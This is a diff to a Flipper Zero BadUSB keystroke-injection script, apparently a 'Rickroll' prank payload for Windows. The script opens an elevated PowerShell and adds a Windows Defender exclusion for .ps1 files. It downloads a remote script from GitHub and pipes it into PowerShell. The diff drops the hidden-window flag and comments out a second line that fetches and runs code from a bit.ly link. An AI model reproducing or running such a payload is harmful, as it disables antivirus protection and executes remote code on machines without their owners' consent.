@@ -16,7 +16,7 @@ GUI d
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell.exe -WindowStyle hidden
+STRING powershell.exe
 DELAY 200
 CTRL SHIFT ENTER
 DELAY 5000
@@ -30,7 +30,7 @@ STRING Add-MpPreference -ExclusionExtension ps1 -Force
 ENTER
 STRING Invoke-WebRequest https://raw.githubusercontent.com/katekyy/flipper_archives/main/BadUSB/Windows/Fun/Rickroll/Rickroll.ps1 -OutFile .\Rickroll.ps1
 ENTER
-STRING iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
-ENTER
+REM STRING iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+REM ENTER
 STRING Get-Content .\Rickroll.ps1 | PowerShell.exe -noprofile -
 ENTER
